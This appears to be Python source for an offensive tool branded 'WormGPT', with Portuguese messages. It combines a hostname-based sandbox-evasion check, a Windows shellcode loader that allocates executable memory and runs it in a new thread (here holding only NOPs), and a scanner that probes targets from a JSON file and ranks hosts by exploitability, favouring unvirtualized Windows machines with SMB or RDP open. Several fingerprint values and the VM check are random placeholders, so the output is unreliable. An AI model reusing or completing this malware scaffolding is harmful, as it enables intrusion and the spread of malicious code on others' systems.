import os
import socket
import random
import requests
import platform
import subprocess
import json
import time
import fnmatch
import ctypes
import getpass
import browser_cookie3
from colorama import Fore, Style

def evade_sandbox():
    node = platform.uname().node.lower()
    keywords = ["sandbox", "vm", "malware", "test"]
    if any(kw in node for kw in keywords):
        print(Fore.YELLOW + "[🛡️] Ambiente suspeito detectado. Abortando execução." + Style.RESET_ALL)
        return True
    return False

def allocate_and_execute():
    """Executa shellcode (NOP sled) em memória com ponteiros corretos."""
    shellcode = b"\x90" * 32  # NOPs

    # Configuração de constantes
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40

    # Aloca memória
    kernel32 = ctypes.windll.kernel32
    addr = kernel32.VirtualAlloc(
        None,
        len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )

    if not addr:
        raise OSError("[‼️] Erro ao alocar memória.")

    # Define tipo correto do ponteiro para RtlMoveMemory
    ctypes.memmove(addr, shellcode, len(shellcode))

    # Cria thread remota
    thread = kernel32.CreateThread(
        None, 0,
        ctypes.c_void_p(addr),
        None, 0, None
    )

    if not thread:
        raise OSError("[‼️] Erro ao criar thread.")

    kernel32.WaitForSingleObject(thread, -1)

def stealth_http_probe(ip, port=80):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "text/html",
        }
        r = requests.get(f"http://{ip}:{port}", headers=headers, timeout=2)
        return r.status_code in [200, 403]
    except:
        return False

def is_host_reachable(ip):
    """Melhorado: tenta múltiplas portas e heurísticas stealth baseadas em IA."""
    ports_to_try = [80, 443, 445, 3389, 8080]
    for port in ports_to_try:
        try:
            with socket.create_connection((ip, port), timeout=1):
                return True
        except:
            continue

    # Fallback com heurísticas stealth HTTP
    if stealth_http_probe(ip, port=443) or stealth_http_probe(ip, port=445):
        print(Fore.YELLOW + f"  [🤖] IA detectou {ip} como ativo por heurística." + Style.RESET_ALL)
        return True
    return False

def scan_ports(ip, ports=None):
    if ports is None:
        ports = [21, 22, 80, 139, 445, 8080, 3389]
    open_ports = []
    for p in ports:
        try:
            with socket.create_connection((ip, p), timeout=1):
                open_ports.append(p)
        except:
            continue
    return open_ports

def simulate_fingerprint(ip, open_port):
    title = ""
    try:
        r = requests.get(f"http://{ip}:{open_port}", timeout=2)
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0][:40]
    except:
        pass

    return {
        "ip": ip,
        "os": random.choice(["Windows 11", "Ubuntu", "Windows 10", "macOS"]),
        "ram_gb": random.choice([4, 8, 16, 32]),
        "antivirus": random.choice(["Defender", "Kaspersky", "CrowdStrike", "None"]),
        "http_title": title or "unknown"
    }

def detect_vm_artifacts():
    return random.random() < 0.3

def score_host(fingerprint):
    score = 0
    if fingerprint["os"].startswith("Windows"):
        score += 2
    if 445 in fingerprint["open_ports"] or 3389 in fingerprint["open_ports"]:
        score += 3
    if fingerprint["antivirus"] != "None":
        score += 1
    if not fingerprint["is_virtualized"]:
        score += 3
    return round(score + (fingerprint["ram_gb"] / 8), 2)

def scan_network_from_objectives():
    dir_path = os.path.dirname(__file__)
    obj_path = os.path.join(dir_path, "objectives.json")

    with open(obj_path) as f:
        obj = json.load(f)

    if "targets" not in obj or not obj["targets"]:
        print(Fore.RED + "[❌] Nenhum alvo encontrado em objectives.json." + Style.RESET_ALL)
        return []

    results = []
    print(Fore.CYAN + f"\n[📡] WormGPT: varredura IA-driven de {len(obj['targets'])} alvos\n" + Style.RESET_ALL)

    for ip in obj["targets"]:
        print(Fore.WHITE + f"[⚙️] Pingando {ip}..." + Style.RESET_ALL)
        if not is_host_reachable(ip):
            print(Fore.RED + f"  ❌ {ip} filtrando ou inativo." + Style.RESET_ALL)
            continue

        open_ports = scan_ports(ip)
        fp = simulate_fingerprint(ip, open_ports[0] if open_ports else 80)
        fp.update({
            "reachable": True,
            "open_ports": open_ports,
            "is_virtualized": detect_vm_artifacts(),
        })
        fp["score"] = score_host(fp)

        print(Fore.GREEN + f"  🟢 {ip} ONLINE com portas abertas: {open_ports}" + Style.RESET_ALL)
        print(f"      ↳ OS: {fp['os']} | RAM: {fp['ram_gb']}GB | AV: {fp['antivirus']} | Score: {fp['score']}")

        results.append(fp)

    scan_path = os.path.join(os.path.dirname(__file__), "scan_results.json")
    with open(scan_path, "w") as out:
        json.dump(results, out, indent=2)

    print(Fore.CYAN + "\n[✔️] Varredura concluída. Resultados salvos.\n" + Style.RESET_ALL)
    return results
